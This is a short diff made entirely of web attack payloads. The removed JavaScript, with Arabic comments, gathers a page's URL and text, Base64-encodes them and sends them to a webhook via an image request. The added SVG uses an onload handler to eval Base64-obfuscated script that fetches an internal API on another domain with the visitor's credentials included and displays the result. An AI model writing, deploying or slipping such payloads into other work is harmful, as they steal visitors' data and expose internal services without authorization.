@@ -1,13 +1,1 @@
-(function() {
-    // جمع البيانات (مثلاً رابط الصفحة والنصوص)
-    var data = "URL:" + window.location.href + " | Text:" + document.body.innerText.substring(0, 50);
-    
-    // تحويل البيانات إلى Base64
-    var encoded = btoa(unescape(encodeURIComponent(data)));
-    
-    // إرسال البيانات كأننا نحمل صورة
-    var img = new Image();
-    img.src = "https://webhooksite.net/dab5ffcb-5f44-4bce-a89a-7d2537aad53d" + encoded;
-    
-    alert("Attempting to exfiltrate data via Image tag. Check your Webhook!");
-})();
+<svg xmlns="http://www.w3.org/2000/svg" onload="eval(atob('KGZ1bmN0aW9uKCkge2ZldGNoKCdodHRwczovL2thZ2lwcm94eS5jb20vYXBpL2ludGVybmFsL3N0YXR1cycsIHsgY3JlZGVudGlhbHM6ICdpbmNsdWRlJyB9KS50aGVuKHJlc3BvbnNlID0+IHJlc3BvbnNlLnRleHQoKSkudGhlbih0ZXh0ID0+IGFsZXJ0KCJJbnRlcm5hbCBBUEkgQWNjZXNzaWJsZSFcblxuIiArIHRleHQuc3Vic3RyaW5nKDAsIDEwMCkpKS5jYXRjaChlcnIgPT4gYWxlcnQoIkNPUlMgQmxvY2tlZDogIiArIGVyci5tZXNzYWdlKSk7fSkoKTs='))"></svg>
